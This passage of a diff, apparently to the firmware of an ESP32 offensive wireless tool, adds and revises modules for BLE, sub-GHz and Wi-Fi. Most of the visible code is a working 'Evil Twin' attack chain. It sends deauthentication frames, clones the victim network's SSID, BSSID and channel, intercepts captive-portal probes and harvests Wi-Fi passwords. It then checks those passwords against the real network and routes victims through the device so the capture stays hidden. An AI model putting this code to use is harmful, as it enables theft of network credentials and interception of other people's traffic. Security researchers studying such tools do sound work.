      return JS_UNDEFINED;
  }
 diff --git a/src/modules/bjs_interpreter/ir_js.cpp b/src/modules/bjs_interpreter/ir_js.cpp
-index e23370d..fb1d66e 100644
+index e23370d7..fb1d66e0 100644
 --- a/src/modules/bjs_interpreter/ir_js.cpp
 +++ b/src/modules/bjs_interpreter/ir_js.cpp
 @@ -1,11 +1,24 @@
@@ -22104,7 +22122,7 @@ index e23370d..fb1d66e 100644
  
  #endif
 diff --git a/src/modules/bjs_interpreter/nrf24_js.cpp b/src/modules/bjs_interpreter/nrf24_js.cpp
-index a3015ff..c23e9d7 100644
+index a3015ffe..c23e9d77 100644
 --- a/src/modules/bjs_interpreter/nrf24_js.cpp
 +++ b/src/modules/bjs_interpreter/nrf24_js.cpp
 @@ -1,6 +1,24 @@
@@ -22140,7 +22158,7 @@ index a3015ff..c23e9d7 100644
  
  #endif
 diff --git a/src/modules/bjs_interpreter/protopirate_js.cpp b/src/modules/bjs_interpreter/protopirate_js.cpp
-index 09920d5..6f964a1 100644
+index 09920d59..6f964a12 100644
 --- a/src/modules/bjs_interpreter/protopirate_js.cpp
 +++ b/src/modules/bjs_interpreter/protopirate_js.cpp
 @@ -1,6 +1,20 @@
@@ -22171,7 +22189,7 @@ index 09920d5..6f964a1 100644
  #endif
 +#endif
 diff --git a/src/modules/bjs_interpreter/rfid_js.cpp b/src/modules/bjs_interpreter/rfid_js.cpp
-index 6c58542..54ffa9b 100644
+index 6c585422..54ffa9b0 100644
 --- a/src/modules/bjs_interpreter/rfid_js.cpp
 +++ b/src/modules/bjs_interpreter/rfid_js.cpp
 @@ -7,6 +7,28 @@
@@ -22211,7 +22229,7 @@ index 6c58542..54ffa9b 100644
  
  #endif
 diff --git a/src/modules/bjs_interpreter/subghz_js.cpp b/src/modules/bjs_interpreter/subghz_js.cpp
-index ffd58b4..0e2ad2b 100644
+index ffd58b47..0e2ad2bd 100644
 --- a/src/modules/bjs_interpreter/subghz_js.cpp
 +++ b/src/modules/bjs_interpreter/subghz_js.cpp
 @@ -1,11 +1,20 @@
@@ -22245,7 +22263,7 @@ index ffd58b4..0e2ad2b 100644
  
  #endif
 diff --git a/src/modules/ble/BLE_Suite.cpp b/src/modules/ble/BLE_Suite.cpp
-index 27c887d..7e069c9 100644
+index 27c887d0..7e069c9a 100644
 --- a/src/modules/ble/BLE_Suite.cpp
 +++ b/src/modules/ble/BLE_Suite.cpp
 @@ -20,7 +20,9 @@
@@ -22337,7 +22355,7 @@ index 27c887d..7e069c9 100644
  void showPayloadSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
 diff --git a/src/modules/ble/ble_audit_logic.h b/src/modules/ble/ble_audit_logic.h
 new file mode 100644
-index 0000000..ce6f7d2
+index 00000000..ce6f7d28
 --- /dev/null
 +++ b/src/modules/ble/ble_audit_logic.h
 @@ -0,0 +1,23 @@
@@ -22365,7 +22383,7 @@ index 0000000..ce6f7d2
 +    return selection == 2 && enabled;
 +}
 diff --git a/src/modules/ble/ble_common.cpp b/src/modules/ble/ble_common.cpp
-index 5494bfb..7d16fab 100644
+index 5494bfba..7d16fab8 100644
 --- a/src/modules/ble/ble_common.cpp
 +++ b/src/modules/ble/ble_common.cpp
 @@ -1,4 +1,5 @@
@@ -22445,7 +22463,7 @@ index 5494bfb..7d16fab 100644
  }
 diff --git a/src/modules/ble/ble_gatt_cloner.cpp b/src/modules/ble/ble_gatt_cloner.cpp
 new file mode 100644
-index 0000000..594ca01
+index 00000000..594ca01a
 --- /dev/null
 +++ b/src/modules/ble/ble_gatt_cloner.cpp
 @@ -0,0 +1,1101 @@
@@ -23552,7 +23570,7 @@ index 0000000..594ca01
 +#endif
 diff --git a/src/modules/ble/ble_gatt_cloner.h b/src/modules/ble/ble_gatt_cloner.h
 new file mode 100644
-index 0000000..a0ad8d2
+index 00000000..a0ad8d2e
 --- /dev/null
 +++ b/src/modules/ble/ble_gatt_cloner.h
 @@ -0,0 +1,12 @@
@@ -23570,7 +23588,7 @@ index 0000000..a0ad8d2
 +#endif
 diff --git a/src/modules/ble/ble_gatt_types.h b/src/modules/ble/ble_gatt_types.h
 new file mode 100644
-index 0000000..0f4c3c9
+index 00000000..0f4c3c93
 --- /dev/null
 +++ b/src/modules/ble/ble_gatt_types.h
 @@ -0,0 +1,44 @@
@@ -23620,7 +23638,7 @@ index 0000000..0f4c3c9
 +#endif
 diff --git a/src/modules/ble/ble_guard_logic.h b/src/modules/ble/ble_guard_logic.h
 new file mode 100644
-index 0000000..0cd2810
+index 00000000..0cd28104
 --- /dev/null
 +++ b/src/modules/ble/ble_guard_logic.h
 @@ -0,0 +1,34 @@
@@ -23660,7 +23678,7 @@ index 0000000..0cd2810
 +inline uint16_t bleGuardIncrement(uint16_t hits) { return hits == UINT16_MAX ? hits : hits + 1; }
 diff --git a/src/modules/ble/ble_security_audit.cpp b/src/modules/ble/ble_security_audit.cpp
 new file mode 100644
-index 0000000..15fa7aa
+index 00000000..15fa7aad
 --- /dev/null
 +++ b/src/modules/ble/ble_security_audit.cpp
 @@ -0,0 +1,785 @@
@@ -24451,7 +24469,7 @@ index 0000000..15fa7aa
 +#endif
 diff --git a/src/modules/ble/ble_security_audit.h b/src/modules/ble/ble_security_audit.h
 new file mode 100644
-index 0000000..bafd4e4
+index 00000000..bafd4e40
 --- /dev/null
 +++ b/src/modules/ble/ble_security_audit.h
 @@ -0,0 +1,29 @@
@@ -24485,7 +24503,7 @@ index 0000000..bafd4e4
 +
 +#endif
 diff --git a/src/modules/ble/ble_spam.cpp b/src/modules/ble/ble_spam.cpp
-index a702b84..545a9b8 100644
+index a702b848..545a9b84 100644
 --- a/src/modules/ble/ble_spam.cpp
 +++ b/src/modules/ble/ble_spam.cpp
 @@ -569,7 +569,8 @@ enum BleSpamAttackType {
@@ -24598,7 +24616,7 @@ index a702b84..545a9b8 100644
                  configChanged = false;
 diff --git a/src/modules/ble/ble_tracker_guard.cpp b/src/modules/ble/ble_tracker_guard.cpp
 new file mode 100644
-index 0000000..afbf717
+index 00000000..afbf7171
 --- /dev/null
 +++ b/src/modules/ble/ble_tracker_guard.cpp
 @@ -0,0 +1,324 @@
@@ -24928,7 +24946,7 @@ index 0000000..afbf717
 +}
 diff --git a/src/modules/ble/ble_tracker_guard.h b/src/modules/ble/ble_tracker_guard.h
 new file mode 100644
-index 0000000..1464a9e
+index 00000000..1464a9ef
 --- /dev/null
 +++ b/src/modules/ble/ble_tracker_guard.h
 @@ -0,0 +1,6 @@
@@ -24939,7 +24957,7 @@ index 0000000..1464a9e
 +
 +#endif
 diff --git a/src/modules/others/audio.cpp b/src/modules/others/audio.cpp
-index 89b670e..3ca98cf 100644
+index 89b670ea..3ca98cf5 100644
 --- a/src/modules/others/audio.cpp
 +++ b/src/modules/others/audio.cpp
 @@ -28,7 +28,12 @@ static const UBaseType_t AUDIO_TASK_PRIORITY = 1;
@@ -24970,7 +24988,7 @@ index 89b670e..3ca98cf 100644
      if (waveType == 0) {
          file->addAudioGenerators([volumeScale, hz, toneSec](const float time) {
 diff --git a/src/modules/others/mic.cpp b/src/modules/others/mic.cpp
-index 6409d53..291d78e 100644
+index 6409d539..291d78e8 100644
 --- a/src/modules/others/mic.cpp
 +++ b/src/modules/others/mic.cpp
 @@ -50,6 +50,9 @@ static void apply_gain_to_buffer(int16_t *buffer, size_t samples, float gain) {
@@ -25429,7 +25447,7 @@ index 6409d53..291d78e 100644
  bool mic_record_wav_to_path(
      FS *fs, const String &path, uint32_t max_ms, uint32_t *out_bytes, float gain,
 diff --git a/src/modules/others/mic.h b/src/modules/others/mic.h
-index ca5806a..18d2aa2 100644
+index ca5806a0..18d2aa25 100644
 --- a/src/modules/others/mic.h
 +++ b/src/modules/others/mic.h
 @@ -53,6 +53,7 @@ struct MicConfig {
@@ -25442,7 +25460,7 @@ index ca5806a..18d2aa2 100644
      std::function<bool(void)> onProgress = nullptr
 diff --git a/src/modules/others/sonar_guard.cpp b/src/modules/others/sonar_guard.cpp
 new file mode 100644
-index 0000000..9976780
+index 00000000..9976780c
 --- /dev/null
 +++ b/src/modules/others/sonar_guard.cpp
 @@ -0,0 +1,727 @@
@@ -26175,7 +26193,7 @@ index 0000000..9976780
 +#endif
 diff --git a/src/modules/others/sonar_guard.h b/src/modules/others/sonar_guard.h
 new file mode 100644
-index 0000000..028022a
+index 00000000..028022a3
 --- /dev/null
 +++ b/src/modules/others/sonar_guard.h
 @@ -0,0 +1,6 @@
@@ -26187,7 +26205,7 @@ index 0000000..028022a
 +#endif
 diff --git a/src/modules/others/sonar_signal.h b/src/modules/others/sonar_signal.h
 new file mode 100644
-index 0000000..2104303
+index 00000000..21043031
 --- /dev/null
 +++ b/src/modules/others/sonar_signal.h
 @@ -0,0 +1,46 @@
@@ -26238,7 +26256,7 @@ index 0000000..2104303
 +    }
 +};
 diff --git a/src/modules/others/tururururu.cpp b/src/modules/others/tururururu.cpp
-index 4d2ea72..eab4882 100644
+index 4d2ea723..eab48826 100644
 --- a/src/modules/others/tururururu.cpp
 +++ b/src/modules/others/tururururu.cpp
 @@ -3,31 +3,37 @@
@@ -26671,7 +26689,7 @@ index 4d2ea72..eab4882 100644
      Serial.println();
 diff --git a/src/modules/pwnagotchi/pet_layout.h b/src/modules/pwnagotchi/pet_layout.h
 new file mode 100644
-index 0000000..9df0a69
+index 00000000..9df0a69a
 --- /dev/null
 +++ b/src/modules/pwnagotchi/pet_layout.h
 @@ -0,0 +1,15 @@
@@ -26691,7 +26709,7 @@ index 0000000..9df0a69
 +            footer - 20, availableW};
 +}
 diff --git a/src/modules/pwnagotchi/pwnagotchi.cpp b/src/modules/pwnagotchi/pwnagotchi.cpp
-index f0eaee5..dbfc0ad 100644
+index f0eaee5d..dbfc0ad2 100644
 --- a/src/modules/pwnagotchi/pwnagotchi.cpp
 +++ b/src/modules/pwnagotchi/pwnagotchi.cpp
 @@ -318,6 +318,12 @@ static void advertisePhase(BruceState &s) {
@@ -26731,7 +26749,7 @@ index f0eaee5..dbfc0ad 100644
              lastUiUpdate = millis();
          }
 diff --git a/src/modules/pwnagotchi/ui.cpp b/src/modules/pwnagotchi/ui.cpp
-index ca1f9de..82603dc 100644
+index ca1f9def..82603dcc 100644
 --- a/src/modules/pwnagotchi/ui.cpp
 +++ b/src/modules/pwnagotchi/ui.cpp
 @@ -9,6 +9,35 @@ Thanks to @bmorcelli for his help doing a better code.
@@ -26937,7 +26955,7 @@ index ca1f9de..82603dc 100644
      tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
  #if defined(STACKCHAN)
 diff --git a/src/modules/pwnagotchi/ui.h b/src/modules/pwnagotchi/ui.h
-index 23e8e3c..697864a 100644
+index 23e8e3c4..697864a2 100644
 --- a/src/modules/pwnagotchi/ui.h
 +++ b/src/modules/pwnagotchi/ui.h
 @@ -12,6 +12,13 @@ Thanks to @bmorcelli for his help doing a better code.
@@ -26956,7 +26974,7 @@ index 23e8e3c..697864a 100644
  void drawTime();
 diff --git a/src/modules/wifi/chain_logic.h b/src/modules/wifi/chain_logic.h
 new file mode 100644
-index 0000000..819464c
+index 00000000..819464cc
 --- /dev/null
 +++ b/src/modules/wifi/chain_logic.h
 @@ -0,0 +1,554 @@
@@ -27516,14 +27534,15 @@ index 0000000..819464c
 +}
 diff --git a/src/modules/wifi/chain_orchestrator.cpp b/src/modules/wifi/chain_orchestrator.cpp
 new file mode 100644
-index 0000000..c22391b
+index 00000000..d5f26ade
 --- /dev/null
 +++ b/src/modules/wifi/chain_orchestrator.cpp
-@@ -0,0 +1,847 @@
+@@ -0,0 +1,896 @@
 +#include "chain_orchestrator.h"
 +#if !defined(LITE_VERSION)
 +
 +#include "chain_logic.h"
++#include "evil_twin_logic.h"
 +
 +#include "core/config.h"
 +#include "core/display.h"
@@ -28082,12 +28101,16 @@ index 0000000..c22391b
 +    // We will use portalNaptStartEvilTwin which handles fallback to verified creds
 +    // For now use same targetSsid as AP clone, and uplink will be filled after verify
 +    String err;
-+    // Use EvilTwin helper: deauth ON, verify ON, clone same SSID/channel, route via verified password
-+    bool ok = portalNaptStartEvilTwin(targetSsid, targetCh, "", "", &err);
++    // Deauth ON, verify ON, clone on the *target* channel, route in place.
++    // The target BSSID + channel are forwarded so the clone beacons exactly
++    // where the victim expects its network and verification never re-tunes the
++    // SoftAP (the old path did, which dropped every attached client).
++    bool ok = portalNaptStartEvilTwinEx(targetSsid, targetCh, hasPick ? picked.bssid : nullptr, true, true, &err);
 +    if (!ok) { displayError(String("Start failed: ")+err, true); chainLog("evil-twin-route","start",false,err); return; }
 +    markActive(CHAIN_EVIL_TWIN);
 +    chainLog("evil-twin-route","start",true,targetSsid+" CH"+String(targetCh)+" deauth+clone+verify+route");
-+    displaySuccess(String("Running: ")+targetSsid+"\nDeauth+Clone+Verify+Route\nWait for pass -> auto Route", true);
++    displaySuccess(String("Running: ")+targetSsid+" CH"+String(targetCh)+
++                   "\nDeauth is a short kick window.\nVictim joins clone -> key checked -> auto Route (no drop)", true);
 +}
 +
 +static void usbVerifyMenu() {
@@ -28236,12 +28259,18 @@ index 0000000..c22391b
 +            ChainTarget target;
 +            int bestCh=0;
 +            if (!pickReconTarget(target, bestCh, err)) {
-+                if (errOut) *errOut = err + " (cần Analyzer snapshot hoặc nhập tay trên thiết bị)";
++                if (errOut) *errOut = err + " (run Analyzer first, or pick the SSID on the device)";
 +                chainLog("evil-twin-route","pick-target",false,err);
 +                return false;
 +            }
++            if (!evilTwinChannelUsable(target.channel)) {
++                err = "Target channel unknown; clone would be blind";
++                if (errOut) *errOut = err;
++                chainLog("evil-twin-route","precheck",false,err);
++                return false;
++            }
 +            String ssid=String(target.ssid);
-+            ok = portalNaptStartEvilTwin(ssid, target.channel, "", "", &err);
++            ok = portalNaptStartEvilTwinEx(ssid, target.channel, target.bssid, true, true, &err);
 +            chainLog("evil-twin-route","start",ok, ok? ssid+" CH"+String(target.channel):err);
 +            if (errOut && !ok) *errOut=err;
 +            break;
@@ -28285,7 +28314,7 @@ index 0000000..c22391b
 +            chainLog("usb-verify", "stop", true, "LED Link stopped");
 +            break;
 +        case CHAIN_EVIL_TWIN:
-+            portalNaptStop();
++            portalNaptStop(); // aborts an in-flight verify, keeps NAPT if routed
 +            chainLog("evil-twin-route", "stop", true, "Evil Twin stopped");
 +            break;
 +        default: break;
@@ -28307,6 +28336,40 @@ index 0000000..c22391b
 +    }
 +}
 +
++// Running chains as [{id, step, status}], matching the WebUI monitor panel.
++// For the Evil Twin "step" is the live phase, so a stalled chain shows up as
++// "Clone" instead of a green RUN badge that never changes.
++static String evilTwinRunningJson() {
++    String out = "\"running\":[";
++    bool first = true;
++    if (chainIsRunning("evil-twin-route")) {
++        String st = portalNaptGetStateJson(); // phase/deauth/verify/lastErr
++        auto grab = [&](const char *key, const char *def) -> String {
++            String needle = String("\"") + key + "\":\"";
++            int a = st.indexOf(needle);
++            if (a < 0) return String(def);
++            a += (int)needle.length();
++            int b = st.indexOf('"', a);
++            if (b < 0) return String(def);
++            return st.substring(a, b);
++        };
++        out += "{\"id\":\"evil-twin-route\",\"step\":\"" + grab("phase", "Clone") +
++               "\",\"status\":\"RUN\",\"deauth\":\"" + grab("deauth", "wait") +
++               "\",\"verify\":\"" + grab("verify", "pending") + "\"}";
++        first = false;
++    }
++    for (uint8_t i = CHAIN_RECON_CAPTURE; i < CHAIN_COUNT; i++) {
++        ChainId cid = (ChainId)i;
++        if (cid == CHAIN_EVIL_TWIN) continue;
++        if (!chainIsRunning(chainIdName(cid))) continue;
++        if (!first) out += ",";
++        first = false;
++        out += "{\"id\":\"" + String(chainIdName(cid)) + "\",\"step\":\"run\",\"status\":\"RUN\"}";
++    }
++    out += "]";
++    return out;
++}
++
 +String chainGetStateJson() {
 +    String j = "{";
 +    j += "\"active\":\"" + String(chainIdName(s_activeChain)) + "\",";
@@ -28323,7 +28386,11 @@ index 0000000..c22391b
 +        j += "{\"id\":\"" + String(chainIdName(cid)) + "\",\"title\":\"" + String(chainIdTitle(cid)) +
 +             "\",\"running\":" + String(chainIsRunning(chainIdName(cid)) ? "true" : "false") + "}";
 +    }
-+    j += "]}";
++    j += "],";
++    // The WebUI "Active Chains & Tools" panel reads chain.running[].step but
++    // firmware only ever published chain.chains, so the panel stayed empty.
++    j += evilTwinRunningJson();
++    j += "}";
 +    return j;
 +}
 +
@@ -28369,7 +28436,7 @@ index 0000000..c22391b
 +#endif
 diff --git a/src/modules/wifi/chain_orchestrator.h b/src/modules/wifi/chain_orchestrator.h
 new file mode 100644
-index 0000000..cdfa3fa
+index 00000000..cdfa3faa
 --- /dev/null
 +++ b/src/modules/wifi/chain_orchestrator.h
 @@ -0,0 +1,35 @@
@@ -28409,7 +28476,7 @@ index 0000000..cdfa3fa
 +
 +#endif
 diff --git a/src/modules/wifi/channel_analyzer.cpp b/src/modules/wifi/channel_analyzer.cpp
-index 353b864..006bee3 100644
+index 353b8641..006bee36 100644
 --- a/src/modules/wifi/channel_analyzer.cpp
 +++ b/src/modules/wifi/channel_analyzer.cpp
 @@ -1,5 +1,6 @@
@@ -29030,18 +29097,56 @@ index 353b864..006bee3 100644
  
  #endif
 diff --git a/src/modules/wifi/evil_portal.cpp b/src/modules/wifi/evil_portal.cpp
-index 59ed80e..d218da9 100644
+index 59ed80ed..54194c21 100644
 --- a/src/modules/wifi/evil_portal.cpp
 +++ b/src/modules/wifi/evil_portal.cpp
-@@ -8,6 +8,7 @@
+@@ -8,12 +8,34 @@
  #include "core/wifi/wifi_common.h"
  #include "esp_wifi.h"
  #include "wifi_atks.h"
 +#include "portal_napt.h"
++#include "evil_twin_logic.h"
  
  static DNSServer &sharedEvilPortalDnsServer() {
      static DNSServer server;
-@@ -67,6 +68,8 @@ bool EvilPortal::setup() {
+     return server;
+ }
+ 
++// Set by portalNaptStop()/the chain so a running verification aborts promptly
++// instead of holding the radio for the whole timeout after "stop".
++static volatile bool s_verifyAbort = false;
++// Last STA disconnect reason (WIFI_REASON_*), used to tell "wrong password"
++// (4-way handshake timeout) from "AP gone" (beacon timeout) instead of
++// reporting every failure as a bad key.
++static volatile int s_lastStaDisconnectReason = 0;
++
++static void evilPortalStaEvent(arduino_event_id_t event, arduino_event_info_t info) {
++    // Called from the Wi-Fi event task: keep it branch-light and non-blocking.
++    if (event == ARDUINO_EVENT_WIFI_STA_DISCONNECTED) {
++        s_lastStaDisconnectReason = (int)info.wifi_sta_disconnected.reason;
++    } else if (event == ARDUINO_EVENT_WIFI_STA_CONNECTED) {
++        s_lastStaDisconnectReason = 0;
++    }
++}
++
++void evilPortalVerifyAbort() { s_verifyAbort = true; }
++void evilPortalVerifyAbortReset() { s_verifyAbort = false; }
++
+ EvilPortal::EvilPortal(
+     String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode,
+     String templateFile
+@@ -26,6 +48,10 @@ EvilPortal::EvilPortal(
+     _wifiWasConnected = WiFi.isConnected();
+ 
+     if (!setup()) return;
++    if (!_staEventRegistered) {
++        WiFi.onEvent(evilPortalStaEvent);
++        _staEventRegistered = true;
++    }
+     cleanlyStopWebUiForWiFiFeature();
+     beginAP();
+     if (!_backgroundMode) { loop(); }
+@@ -67,6 +93,8 @@ bool EvilPortal::setup() {
      if (_autoMode) {
          if (apName.isEmpty()) apName = "Free Wifi";
          if (!_autoTemplateFile.isEmpty() && loadCustomHtmlFromPath(_autoTemplateFile)) { return true; }
@@ -29050,13 +29155,100 @@ index 59ed80e..d218da9 100644
          if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
              apName.indexOf("firmware") != -1 || _verifyPwd) {
              loadDefaultHtml_one();
-@@ -267,6 +270,16 @@ void EvilPortal::setupRoutes() {
+@@ -142,30 +170,26 @@ void EvilPortal::beginAP() {
+     while (millis() - tmp < 3000) yield();
+ 
+     setupRoutes();
+-    dnsServer->start(53, "*", WiFi.softAPIP());
++    startCaptiveDns();
+     webServer.begin();
+ }
+ 
+ void EvilPortal::setupRoutes() {
++    // Every connectivity probe goes through serveProbe(): while the clone is
++    // still a portal it must intercept (redirect to the login page), and once
++    // the victim is routed it must answer success. Answering 302 forever is
++    // what keeps Android stuck on "Connected, no internet" even after the
++    // victim really has internet behind us.
+     webServer.on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
+-        AsyncWebServerResponse *response = request->beginResponse(302);
+-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+-        request->send(response);
++        serveProbe(request, "/generate_204");
+     });
+ 
+     webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
+-        AsyncWebServerResponse *response = request->beginResponse(302);
+-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+-        request->send(response);
++        serveProbe(request, "/gen_204");
+     });
+ 
+     webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
+-        request->send(
+-            200,
+-            "text/html",
+-            "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() +
+-                "\"></head><body></body></html>"
+-        );
++        serveProbe(request, "/hotspot-detect.html");
+     });
+ 
+     webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
+@@ -175,15 +199,11 @@ void EvilPortal::setupRoutes() {
+     });
+ 
+     webServer.on("/ncsi.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
+-        AsyncWebServerResponse *response = request->beginResponse(302);
+-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+-        request->send(response);
++        serveProbe(request, "/ncsi.txt");
+     });
+ 
+     webServer.on("/connecttest.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
+-        AsyncWebServerResponse *response = request->beginResponse(302);
+-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+-        request->send(response);
++        serveProbe(request, "/connecttest.txt");
+     });
+ 
+     webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
+@@ -211,15 +231,11 @@ void EvilPortal::setupRoutes() {
+     });
+ 
+     webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
+-        AsyncWebServerResponse *response = request->beginResponse(302);
+-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+-        request->send(response);
++        serveProbe(request, "/detectportal.firefox.com/success.txt");
+     });
+ 
+     webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
+-        AsyncWebServerResponse *response = request->beginResponse(302);
+-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+-        request->send(response);
++        serveProbe(request, "/client.msftconnecttest.com/redirect");
+     });
+ 
+     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
+@@ -253,9 +269,7 @@ void EvilPortal::setupRoutes() {
+             url.indexOf("ncsi") != -1 || url.indexOf("nmcheck") != -1 || url.indexOf("gnome") != -1 ||
+             url.indexOf("ubuntu") != -1 || url.indexOf("canonical") != -1 ||
+             url.indexOf("networkcheck") != -1 || url.indexOf("hotspot") != -1) {
+-            AsyncWebServerResponse *response = request->beginResponse(302);
+-            response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+-            request->send(response);
++            serveProbe(request, url);
+         } else if (request->args() > 0) {
+             credsController(request);
+         } else {
+@@ -267,6 +281,16 @@ void EvilPortal::setupRoutes() {
      webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
  }
  
 +void EvilPortal::stop() {
 +    webServer.end();
-+    dnsServer->stop();
++    stopCaptiveDns();
 +    vTaskDelay(pdMS_TO_TICKS(80));
 +    webServer.reset(); // frees the CaptiveRequestHandler we registered
 +    _captiveHandler = nullptr;
@@ -29067,7 +29259,16 @@ index 59ed80e..d218da9 100644
  void EvilPortal::restartWiFi(bool reset) {
      webServer.end();
      dnsServer->stop();
-@@ -295,6 +308,18 @@ void EvilPortal::loop() {
+@@ -279,7 +303,7 @@ void EvilPortal::restartWiFi(bool reset) {
+     vTaskDelay(100 / portTICK_PERIOD_MS);
+ 
+     setupRoutes();
+-    dnsServer->start(53, "*", WiFi.softAPIP());
++    startCaptiveDns();
+     webServer.begin();
+ 
+     if (reset) resetCapturedCredentials();
+@@ -295,6 +319,18 @@ void EvilPortal::loop() {
      bool exitPortal = false;
  
      while (true) {
@@ -29086,7 +29287,28 @@ index 59ed80e..d218da9 100644
          if (_pendingWifiRestart) {
              _pendingWifiRestart = false;
              restartWiFi();
-@@ -373,6 +398,8 @@ void EvilPortal::loop() {
+@@ -308,9 +344,18 @@ void EvilPortal::loop() {
+ 
+         dnsServer->processNextRequest();
+ 
+-        if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
+-            send_raw_frame(deauth_frame, 26);
++        // Deauth is a *windowed kick* driven by the chain (safety gates: never
++        // while a victim is on our AP, never while verifying, never after
++        // routing). This class only sends when explicitly told to.
++        if (!isDeauthHeld && _deauth && _deauthPulseAt && millis() - _deauthPulseAt < 4000) {
++            for (uint8_t i = 0; i < 3; i++) {
++                send_raw_frame(deauth_frame, 26);
++                vTaskDelay(pdMS_TO_TICKS(2));
++            }
+             lastDeauthTime = millis();
++            _deauthPulseAt = 0;
++        } else if (!_deauth) {
++            _deauthPulseAt = 0;
+         }
+ 
+         if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
+@@ -373,11 +418,13 @@ void EvilPortal::loop() {
  
  void EvilPortal::processRequests() {
      if (!_backgroundMode) return;
@@ -29095,7 +29317,13 @@ index 59ed80e..d218da9 100644
      if (_pendingWifiRestart) {
          _pendingWifiRestart = false;
          restartWiFi();
-@@ -484,8 +517,10 @@ void EvilPortal::printLastCapturedCredential() {
+     }
+-    dnsServer->processNextRequest();
++    if (dnsRunning) dnsServer->processNextRequest();
+     if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
+         previousTotalCapturedCredentials = totalCapturedCredentials - 1;
+     }
+@@ -484,8 +531,10 @@ void EvilPortal::printLastCapturedCredential() {
  }
  
  void EvilPortal::printDeauthStatus() {
@@ -29108,7 +29336,7 @@ index 59ed80e..d218da9 100644
      } else {
          tft.setTextColor(TFT_RED);
          printFootnote("Deauth ON");
-@@ -514,6 +549,40 @@ void EvilPortal::loadCustomHtml() {
+@@ -514,6 +563,40 @@ void EvilPortal::loadCustomHtml() {
      }
  }
  
@@ -29149,8 +29377,24 @@ index 59ed80e..d218da9 100644
  bool EvilPortal::loadCustomHtmlFromPath(const String &path) {
      if (path.isEmpty()) return false;
      if (!getFsStorage(fsHtmlFile) || !fsHtmlFile->exists(path)) return false;
-@@ -716,13 +785,14 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+@@ -714,15 +797,30 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+     htmlResponse += "</li>\n";
+ 
      if (_verifyPwd && passwordValue != "") {
++        // Never run the handshake test here: this runs inside the AsyncWebServer
++        // request task, so a 6 s WiFi.begin() stalls the response and phones
++        // (Android especially) abandon the network mid-flight. Answer at once,
++        // then let the chain's background task verify.
++        if (_asyncVerify) {
++            _pendingCredSsid = apName;
++            _pendingCredPwd = passwordValue;
++            totalCapturedCredentials++;
++            saveToCSV(csvLine);
++            request->send(200, "text/html", verifyWaitPage());
++            capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
++            _pendingCredReady = true;
++            return;
++        }
          request->send(200, "text/html", wifiLoadPage());
          bool isCorrect = verifyCreds(apName, passwordValue);
 +        _lastVerifiedSsid = apName;
@@ -29167,7 +29411,7 @@ index 59ed80e..d218da9 100644
              vTaskDelay(50 / portTICK_PERIOD_MS);
              verifyPass = true;
              _deauth = false;
-@@ -738,6 +808,10 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+@@ -738,6 +836,181 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
  
      capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
      totalCapturedCredentials++;
@@ -29175,14 +29419,196 @@ index 59ed80e..d218da9 100644
 +        _naptHandoffPending = true;
 +        _naptHandoffAt = millis();
 +    }
++}
++
++// ---------------------------------------------------------------------------
++// Deauth + Clone + Verify + Route support
++// ---------------------------------------------------------------------------
++
++void EvilPortal::startCaptiveDns() {
++    if (dnsRunning) return;
++    // While the victim is only talking to the portal, answer every name with
++    // our own IP so the OS shows the login page (captive-portal hint).
++    dnsServer->start(53, "*", WiFi.softAPIP());
++    dnsRunning = true;
++}
++
++void EvilPortal::stopCaptiveDns() {
++    if (!dnsRunning) return;
++    dnsServer->stop();
++    dnsRunning = false;
++    // Give lwIP a tick to release UDP/53 before the NAPT resolver binds it.
++    vTaskDelay(pdMS_TO_TICKS(40));
++}
++
++void EvilPortal::setInternetUp(bool up) {
++    if (_internetUp == up) return;
++    _internetUp = up;
++    if (up) {
++        // Routing for real now: stop hijacking DNS (NAPT owns port 53 and must
++        // resolve normally, otherwise the victim's apps look "connected but
++        // broken" and Android flips back to mobile data), and stop kicking.
++        stopCaptiveDns();
++        _deauth = false;
++        _deauthPulseAt = 0;
++        _naptHandoffPending = false;
++    } else if (dnsRunning == false) {
++        startCaptiveDns();
++    }
++}
++
++int EvilPortal::apClientCount() {
++    wifi_sta_list_t list = {};
++    if (esp_wifi_ap_get_sta_list(&list) != ESP_OK) return 0;
++    return (int)list.num;
++}
++
++bool EvilPortal::takePendingCredentials(String &ssid, String &pwd) {
++    if (!_pendingCredReady) return false;
++    ssid = _pendingCredSsid;
++    pwd = _pendingCredPwd;
++    _pendingCredReady = false;
++    return true;
++}
++
++void EvilPortal::notifyVerifyResult(bool ok) {
++    _lastVerifyOk = ok;
++    if (ok) {
++        _lastVerifiedSsid = apName;
